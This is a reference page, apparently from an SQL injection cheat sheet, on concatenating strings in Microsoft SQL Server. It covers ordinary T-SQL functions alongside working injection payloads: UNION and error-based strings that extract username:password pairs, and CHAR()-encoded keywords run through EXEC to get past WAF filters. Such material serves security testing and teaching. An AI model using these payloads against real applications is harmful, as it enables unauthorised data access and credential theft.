---
title: String Concatenation
description: Methods for string concatenation in MSSQL
category: Injection Techniques
order: 9
tags: ["string operations", "concatenation", "T-SQL"]
lastUpdated: 2025-03-15
---

## String Concatenation

String concatenation is an essential technique for SQL injection in Microsoft SQL Server, allowing attackers to construct complex queries and bypass security filters. MSSQL provides several methods for concatenating strings.

### Using the + Operator

The most common method for string concatenation in SQL Server is the `+` operator:

```sql
SELECT 'a' + 'b' + 'c';  -- Returns: 'abc'
```

If any operand is NULL, the result will be NULL unless you use ISNULL or COALESCE:

```sql
SELECT 'a' + NULL + 'c';  -- Returns: NULL
SELECT 'a' + ISNULL(NULL, '') + 'c';  -- Returns: 'ac'
```

### Using CONCAT() Function (SQL Server 2012+)

The `CONCAT()` function handles NULL values automatically:

```sql
SELECT CONCAT('a', 'b', 'c');  -- Returns: 'abc'
SELECT CONCAT('a', NULL, 'c');  -- Returns: 'ac'
```

### Using CONCAT_WS() Function (SQL Server 2017+)

`CONCAT_WS()` (Concatenate With Separator) joins strings with a specified separator:

```sql
SELECT CONCAT_WS(',', 'a', 'b', 'c');  -- Returns: 'a,b,c'
SELECT CONCAT_WS(',', 'a', NULL, 'c');  -- Returns: 'a,c'
```

### Using STRING_AGG() Function (SQL Server 2017+)

For aggregating multiple rows into a single string:

```sql
SELECT STRING_AGG(name, ',') FROM sys.databases;
-- Returns: 'master,tempdb,model,msdb,...'
```

### Using FOR XML PATH (SQL Server 2005+)

Before STRING_AGG, this was the common method for aggregating strings:

```sql
SELECT STUFF((
    SELECT ',' + name 
    FROM sys.databases 
    FOR XML PATH('')
), 1, 1, '');
```

### Practical SQL Injection Examples

#### Building Dynamic Queries

```sql
-- Creating a dynamic query string
DECLARE @sql nvarchar(500)
SET @sql = 'SELECT * FROM ' + 'users' + ' WHERE id = ' + '1'
EXEC(@sql)
```

#### Data Extraction with Concatenation

```sql
-- UNION attack with concatenated output
' UNION SELECT NULL, (SELECT username + ':' + password FROM users FOR XML PATH('')), NULL--
```

#### Error-based Extraction

```sql
-- Error-based extraction using concatenation
' AND 1=CONVERT(int, (SELECT TOP 1 username + ':' + password FROM users))--
```

#### Concatenating Multiple Columns

```sql
-- Combining multiple columns into one string
' UNION SELECT NULL, firstname + ' ' + lastname + ' (' + email + ')', NULL FROM users--
```

### Advanced Concatenation Techniques

#### Type Conversion in Concatenation

When concatenating non-string data types, explicit conversion is recommended:

```sql
-- Concatenating string with integer
SELECT 'User ID: ' + CAST(user_id AS nvarchar(10)) FROM users

-- Alternative using CONCAT (handles conversions automatically)
SELECT CONCAT('User ID: ', user_id) FROM users
```

#### Character Building

Building strings character by character using ASCII values:

```sql
SELECT CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)  -- Returns: 'admin'
```

#### Nested Concatenation

Using nested concatenation for complex strings:

```sql
SELECT 'SELECT * FROM ' + (SELECT DB_NAME()) + '.' + 'users'
```

#### Unicode Considerations

For internationalization, use N prefix and NCHAR():

```sql
SELECT N'Unicode: ' + NCHAR(9731)  -- Returns: 'Unicode: ☃'
```

### Handling NULL Values

NULL handling is critical in string concatenation:

```sql
-- Using ISNULL
SELECT 'First: ' + ISNULL(first_name, 'Unknown') FROM users

-- Using COALESCE (can handle multiple potential NULL values)
SELECT COALESCE(first_name, middle_name, last_name, 'Unknown') FROM users

-- Using NULLIF and ISNULL together
SELECT 'Username: ' + ISNULL(NULLIF(username, ''), 'Not Provided') FROM users
```

### Concatenation in SQL Injection Attacks

#### Bypassing WAF Filters

```sql
-- Breaking up keywords
SELECT CHAR(83) + CHAR(69) + CHAR(76) + CHAR(69) + CHAR(67) + CHAR(84)  -- Builds: 'SELECT'

-- With dynamic execution
DECLARE @cmd varchar(100)
SET @cmd = CHAR(115) + CHAR(101) + CHAR(108) + CHAR(101) + CHAR(99) + CHAR(116) + CHAR(32) + CHAR(42) + CHAR(32) + CHAR(102) + CHAR(114) + CHAR(111) + CHAR(109) + CHAR(32) + CHAR(117) + CHAR(115) + CHAR(101) + CHAR(114) + CHAR(115)
-- @cmd = 'select * from users'
EXEC(@cmd)
```

#### Extracting Multiple Values

```sql
-- Combining multiple rows into one result using STRING_AGG
' UNION SELECT NULL, STRING_AGG(username + ':' + password, ','), NULL FROM users--

-- For older versions using FOR XML PATH
' UNION SELECT NULL, (SELECT username + ':' + password + ',' FROM users FOR XML PATH('')), NULL--
```

### Limitations and Considerations

1. Maximum string length in SQL Server is 8000 bytes for varchar, 4000 characters for nvarchar
2. Performance degrades with very large string operations
3. Implicit conversions can cause unexpected results
4. CONCAT and STRING_AGG are not available in older SQL Server versions
